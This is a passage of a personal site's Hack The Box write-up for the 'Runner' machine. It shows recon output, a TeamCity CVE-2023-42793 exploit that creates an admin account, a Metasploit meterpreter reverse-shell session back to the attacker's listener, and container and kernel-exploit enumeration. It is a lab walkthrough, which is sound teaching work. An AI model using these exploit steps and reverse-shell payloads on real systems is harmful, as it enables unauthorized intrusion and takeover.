@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>document.documentElement.classList.add("js");(function(){function a(k){var o=[];try{var p=String(window.name||"").split(";");for(var i=0;i<p.length;i++){var q=p[i].split("=");if(q[0]===k&&q[1])o.push(q[1])}}catch(e){}try{var m=document.cookie.match(new RegExp("(?:^|; )"+k+"=([^;]*)"));if(m)o.push(decodeURIComponent(m[1]))}catch(e){}try{var v=localStorage.getItem(k);if(v!==null&&typeof v!=="undefined")o.push(v)}catch(e){}return o}function g(k){var v=a(k);return v.length?v[0]:null}function p(){var b=null;a("fg-prefs").forEach(function(r){var x=String(r).split(".");if(x.length!==3)return;var t=parseInt(x[0],36);if(!isFinite(t)||t<=0)return;var th=x[1]==="light"||x[1]==="dark"?x[1]:null;var rl=x[2]==="c"||x[2]==="o"?x[2]:null;if(th||rl){if(!b||t>b.t)b={t:t,th:th,rl:rl}}});if(b)return b;var th=g("fg-theme"),rl=g("fg-spine-v2");if(th==="light"||th==="dark"||rl==="c"||rl==="o")return{t:0,th:th==="light"||th==="dark"?th:null,rl:rl==="c"||rl==="o"?rl:null};return null}try{var s=p();var th=s&&s.th?s.th:(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");document.documentElement.setAttribute("data-theme",th);if(s&&s.rl==="c")document.documentElement.classList.add("nav-collapsed")}catch(e){document.documentElement.setAttribute("data-theme","dark")}})();</script>
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="alternate icon" type="image/x-icon" href="../assets/images/favicon.ico">
+    <link rel="stylesheet" href="../assets/css/reset.css?v=8">
+    <link rel="stylesheet" href="../assets/css/site.css?v=176">
+    <title>Frédéric Goossens | Runner</title>
+</head>
+<body>
+    <a class="skip" href="#main">Skip to content</a>
+
+    <header class="spine">
+        <div class="spine-id">
+            <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
+                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-prompt"><span class="sigil">$</span>whoami</span>
+                <span class="si-name">Frédéric Goossens</span>
+                <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
+            </a>
+            <div class="si-socials">
+                <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+            </div>
+        </div>
+        <nav aria-label="Primary">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span><span class="l">Home</span></a></li>
+                <li><a href="../resume.html"><span class="n">02</span><span class="l">Resume</span></a></li>
+                <li><a href="../writing.html"><span class="n">03</span><span class="l">Writing</span></a></li>
+                <li><a href="../htb.html"><span class="n">04</span><span class="l">HackTheBox</span></a></li>
+            </ul>
+        </nav>
+        <div class="spine-foot">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="spine-toggle" type="button" data-spine-toggle aria-expanded="true" aria-label="Collapse navigation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg></button>
+        </div>
+    </header>
+
+    <div class="topbar">
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <div class="tb-actions">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </div>
+
+    <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
+        <div class="menu-top">
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <button class="close-btn" type="button" data-menu-close>Close ×</button>
+        </div>
+        <nav aria-label="Mobile">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span>Home</a></li>
+                <li><a href="../resume.html"><span class="n">02</span>Resume</a></li>
+                <li><a href="../writing.html"><span class="n">03</span>Writing</a></li>
+                <li><a href="../htb.html"><span class="n">04</span>HackTheBox</a></li>
+            </ul>
+        </nav>
+        <div class="menu-foot">
+            <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+            <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+        </div>
+    </div>
+
+    <div class="progress"></div>
+
+    <div class="shell">
+        <main class="wrap" id="main">
+            <div class="post-wrap">
+                <article class="post" data-cover="../assets/images/htb/runner/logo.png">
+                    <a class="crumb" href="../htbList.html?os=Linux">← All Linux write-ups</a>
+                    <h1 data-type="Runner" data-prefix="# "></h1>
+
+                    <div class="info">
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.6-3 8.2-7 10-4-1.8-7-5.4-7-10V6l7-3z"/></svg>
+                                Platform
+                            </span>
+                            <span class="meta-v">Hack The Box</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M5 20v-4M11 20V10M17 20V4"/></svg>
+                                Difficulty
+                            </span>
+                            <span class="meta-v" data-diff="Medium">Medium</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+                                Read time
+                            </span>
+                            <span class="meta-v" data-read-time-auto=""></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 20l4-1L20 7l-3-3L5 16l-1 4z"/></svg>
+                                Author
+                            </span>
+                            <span class="meta-v">Frédéric Goossens</span>
+                        </div>
+                    </div>
+
+                    <h2>Recon</h2>
+
+<details>
+<summary>nmap</summary>
+<div class="inner">
+<pre><code>PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
+|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
+80/tcp   open  http        nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://runner.htb/
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8000/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Nagios fuzz</summary>
+<div class="inner">
+<pre><code>200      GET        1l        1w        9c http://10.10.11.13:8000/version
+200      GET        1l        1w        3c http://10.10.11.13:8000/health</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Subdomains</summary>
+<div class="inner">
+<figure><p><a href="https://github.com/rbsec/dnscan/blob/master/subdomains-10000.txt" target="_blank" rel="noopener noreferrer">dnscan/subdomains-10000.txt at master · rbsec/dnscan</a></p></figure><pre><code>wfuzz -c -f sub-fighter -w /home/parallels/Downloads/subdomains-10000.txt  -u "http://runner.htb" -H "Host: FUZZ.runner.htb" --hl 7
+
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://runner.htb/
+Total requests: 9985
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000005519:   401        1 L      9 W        66 Ch       "teamcity"  </code></pre>
+</div>
+</details>
+
+<h2>Initial foothold</h2>
+
+<h3>TeamCity - CVE-2023-42793</h3>
+
+<figure><p><a href="https://www.exploit-db.com/exploits/51884" target="_blank" rel="noopener noreferrer">JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)</a> - CVE-2023-42793 . remote exploit for Java platform</p></figure>
+
+<pre><code>┌──(parallels㉿kali)-[~/Downloads]
+└─$ python3 51884.py -u http://teamcity.runner.htb
+
+=====================================================
+*       CVE-2023-42793                              *
+*  TeamCity Admin Account Creation                  *
+*                                                   *
+*  Author: ByteHunter                               *
+=====================================================
+
+Token: eyJ0eXAiOiAiVENWMiJ9.bG1DaUZPT0lBQWJtTnBSaWtxVFh0ZG1oMjVB.NmQyZDUzMzctMWMyNC00MzFjLWIwMDAtMGNiODk0NTYyNGRm
+Successfully exploited!
+URL: http://teamcity.runner.htb
+Username: city_adminZv5w
+Password: Main_password!!**</code></pre>
+
+<blockquote><strong>city_adminZv5w</strong>:<mark class="highlight-red" data-notion-highlight="red">Main_password!!**</mark></blockquote>
+
+<h4>Getting shell</h4>
+
+<pre><code>msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2023_42793) &gt; options
+
+Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2023_42793):
+
+   Name                     Current Setting      Required  Description
+   ----                     ---------------      --------  -----------
+   Proxies                                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                   teamcity.runner.htb  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT                    5555                 yes       The target port (TCP)
+   SSL                      false                no        Negotiate SSL/TLS for outgoing connections
+   TEAMCITY_ADMIN_ID        1                    yes       The ID of an administrator account to authenticate as
+   TEAMCITY_CHANGE_TIMEOUT  30                   yes       The timeout to wait for the changes to be applied
+   VHOST                                         no        HTTP server virtual host
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.16.6       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Linux
+
+msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2023_42793) &gt; set payload cmd/linux/http/x64/meterpreter_reverse_tcp
+payload =&gt; cmd/linux/http/x64/meterpreter_reverse_tcp
+msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2023_42793) &gt; run
+
+[*] Started reverse TCP handler on 10.10.16.6:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. JetBrains TeamCity 2023.05.3 (build 129390) detected.
+[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.Y01RMVRWQlNqTVRDNjl4cnVWb1VqYUJac3p3.MWRjMTJlNDctNDUwMC00MTc5LWEyOGEtMTNjNDkzNDJkZjU5
+[*] Modifying internal.properties to allow process creation...
+[*] Waiting for configuration change to be applied...
+[*] Executing payload...
+[*] Resetting the internal.properties settings...
+[*] Waiting for configuration change to be applied...
+[*] Deleting the authentication token.
+[*] Meterpreter session 1 opened (10.10.16.6:4444 -&gt; 10.10.11.13:45198) at 2024-04-23 15:20:41 +0200
+
+whoami
+tcuser</code></pre>
+
+<h4>Enumeration</h4>
+
+<details>
+<summary>System info</summary>
+<div class="inner">
+<pre><code>Linux version 5.15.0-102-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #112-Ubuntu SMP Tue Mar 5 16:50:32 UTC 2024
+Distributor ID: Ubuntu
+Description:    Ubuntu 20.04.6 LTS
+Release:        20.04
+Codename:       focal</code></pre>
+</div>
+</details>
+
+<details>
+<summary>Exploit suggestions</summary>
+<div class="inner">
+<pre><code>[+] [CVE-2022-0847] DirtyPipe
+
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: probable
+   Tags: [ ubuntu=(20.04|21.04) ],debian=11
+   Download URL: https://haxx.in/files/dirtypipez.c
+
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: probable
+   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded</code></pre>
+</div>
+</details>
+
+<details>
+<summary>docker info</summary>
+<div class="inner">
+<pre><code>╔══════════╣ Protections
+═╣ AppArmor enabled? .............. AppArmor Not Found
+═╣ AppArmor profile? .............. docker-default (enforce)
+═╣ is linuxONE? ................... s390x Not Found
+═╣ grsecurity present? ............ grsecurity Not Found
+═╣ PaX bins present? .............. PaX Not Found
+═╣ Execshield enabled? ............ Execshield Not Found
+═╣ SELinux enabled? ............... sestatus Not Found
+═╣ Seccomp enabled? ............... enabled
+═╣ User namespace? ................ enabled
+═╣ Cgroup2 enabled? ............... enabled
+═╣ Is ASLR enabled? ............... Yes
+═╣ Printer? ....................... No
+═╣ Is this a virtual machine? ..... Yes (docker)
+
+                                   ╔═══════════╗
+═══════════════════════════════════╣ Container ╠═══════════════════════════════════
+                                   ╚═══════════╝
+╔══════════╣ Container related tools present (if any):
+╔══════════╣ Am I Containered?
+╔══════════╣ Container details
+═╣ Is this a container? ........... docker
+═╣ Any running containers? ........ No
+╔══════════╣ Docker Container details
+═╣ Am I inside Docker group ....... No
+═╣ Looking and enumerating Docker Sockets (if any):
+═╣ Docker version ................. Not Found
+═╣ Vulnerable to CVE-2019-5736 .... Not Found
+═╣ Vulnerable to CVE-2019-13139 ... Not Found
+═╣ Rootless Docker? ............... No
+
+
+╔══════════╣ Container &amp; breakout enumeration
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
+═╣ Container ID ................... 647a82f29ca0═╣ Container Full ID .............. /
+═╣ Seccomp enabled? ............... enabled
+═╣ AppArmor profile? .............. docker-default (enforce)
+═╣ User proc namespace? ........... enabled         0          0 4294967295
+═╣ Vulnerable to CVE-2019-5021 .... No
+
+══╣ Breakout via mounts
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
+═╣ /proc mounted? ................. No
+═╣ /dev mounted? .................. No
+═╣ Run ushare ..................... No
+═╣ release_agent breakout 1........ No
+═╣ release_agent breakout 2........ No
+═╣ core_pattern breakout .......... No
+═╣ binfmt_misc breakout ........... No
+═╣ uevent_helper breakout ......... No
+═╣ is modprobe present ............ No
+═╣ DoS via panic_on_oom ........... No
+═╣ DoS via panic_sys_fs ........... No
+═╣ DoS via sysreq_trigger_dos ..... No
+═╣ /proc/config.gz readable ....... No
+═╣ /proc/sched_debug readable ..... No
+═╣ /proc/*/mountinfo readable ..... Yes
+═╣ /sys/kernel/security present ... Yes
+═╣ /sys/kernel/security writable .. No
+</code></pre>
+</div>
+</details>
+
+<details>
+<summary>mounted drives</summary>
+<div class="inner">
+<pre><code>overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/GRBILPBVJIGNCP7AUGM2ALHSIK:/var/lib/docker/overlay2/l/GENZ5CPOOZ7O3IP4VE4RYQU36T:/var/lib/docker/overlay2/l/NX7TPN6KUGABWN3US6O2PFVTOZ:/var/lib/docker/overlay2/l/MCL72MBXKJTJLTOBR5EV4ROIQI:/var/lib/docker/overlay2/l/GF5VJMWW3BRG4ST6SYH3UH6PYN:/var/lib/docker/overlay2/l/VJMT7HAP36IGU4TKQTOP2IQZHZ:/var/lib/docker/overlay2/l/H6IROWEABP56PLRFDVVF27JBAR:/var/lib/docker/overlay2/l/RD3X5KRUF5CUFIZQ5QXXUWBGLM:/var/lib/docker/overlay2/l/YQCSSVA75HC375JGDPNHAUNKX4:/var/lib/docker/overlay2/l/LKJTQQJRE46WMK2ZOGA3XDWHOH:/var/lib/docker/overlay2/l/E4YUV4D3ILKNBP7PUNKU76S76M:/var/lib/docker/overlay2/l/I6ARGTM7SEKRESME6IZW4SK7LI:/var/lib/docker/overlay2/l/VS574X5VON23CLWXU66MCCFZVX,upperdir=/var/lib/docker/overlay2/7775a5b6d01a0269d49e641cdcb43609a55949b4d5d6e70c3e7c84228a9b3f54/diff,workdir=/var/lib/docker/overlay2/7775a5b6d01a0269d49e641cdcb43609a55949b4d5d6e70c3e7c84228a9b3f54/work)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
+cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
+/dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime)
+/dev/sda2 on /etc/hostname type ext4 (rw,relatime)
+/dev/sda2 on /etc/hosts type ext4 (rw,relatime)
+/dev/sda2 on /data/teamcity_server/datadir type ext4 (rw,relatime)
+/dev/sda2 on /opt/teamcity/logs type ext4 (rw,relatime)
+/dev/sda2 on /opt/teamcity/temp type ext4 (rw,relatime)
+proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
+tmpfs on /proc/acpi type tmpfs (ro,relatime,inode64)
+tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/scsi type tmpfs (ro,relatime,inode64)
+tmpfs on /sys/firmware type tmpfs (ro,relatime,inode64)
+tmpfs on /sys/devices/virtual/powercap type tmpfs (ro,relatime,inode64)
+</code></pre>
+</div>
+</details>
+
+<details>
+<summary>processes</summary>
+<div class="inner">
+<pre><code>tcuser         1  0.0  0.0   6980   756 ?        Ss   08:55   0:00 /bin/bash /run-server.sh
+tcuser        15  0.0  0.0   2616   416 ?        S    08:55   0:00 /bin/sh bin/teamcity-server.sh run -config conf/server.xml
+tcuser        20  0.0  0.0   2616   492 ?        S    08:55   0:00  _ sh /opt/teamcity/bin/teamcity-server-restarter.sh run -config conf/server.xml
+tcuser       137 11.2 25.5 5622232 1022728 ?     Sl   08:55  30:53      _ /opt/java/openjdk/bin/java -Djava.util.logging.config.file=/opt/teamcity/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 -server -Xmx2g -XX:ReservedCodeCacheSize=640m -Dteamcity.configuration.path=../conf/teamcity-startup.properties -Dlog4j2.configurationFile=file:/opt/teamcity/bin/../conf/teamcity-server-log4j.xml -Dteamcity_logs=/opt/teamcity/bin/../logs -Djava.awt.headless=true -Dignore.endorsed.dirs= -classpath /opt/teamcity/bin/bootstrap.jar:/opt/teamcity/bin/tomcat-juli.jar -Dcatalina.base=/opt/teamcity -Dcatalina.home=/opt/teamcity -Djava.io.tmpdir=/opt/teamcity/temp org.apache.catalina.startup.Bootstrap -config conf/server.xml start
+tcuser       264  0.1  0.6 3692496 25464 ?       Sl   08:56   0:21          _ /opt/java/openjdk/bin/java -DTCSubProcessName=TeamCityMavenServer -classpath /opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/wagon-file-3.5.1.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/commons-cli-1.4.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/wagon-provider-api-3.5.1.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/plexus-interpolation-1.26.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/plexus-utils-3.3.1.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-builder-support-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/guava-25.1-android.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-util-1.6.3.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-transport-wagon-1.6.3.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-common.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/async-trigger.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/org.eclipse.sisu.inject-0.3.5.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-impl-1.6.3.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-api-1.6.3.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-artifact-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-spi-1.6.3.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-compat-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/slf4j-api-1.7.36.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/org.eclipse.sisu.plexus-0.3.5.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/commons-lang3-3.8.1.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-embedder-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-settings-builder-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-plugin-api-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-connector-basic-1.6.3.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/commons-io-2.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-model-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/javax.annotation-api-1.2.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/javax.inject-1.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/jcl-over-slf4j-1.7.36.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-runner-server.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/plexus-sec-dispatcher-2.0.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/wagon-http-3.5.1-shaded.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/jansi-2.4.0.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/plexus-cipher-2.0.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-repository-metadata-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-slf4j-provider-3.8.6.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/server/guice-4.2.2-no_aop.jar:/opt/teamcity/webapps/ROOT/WEB-INF/plugins/Maven2/ser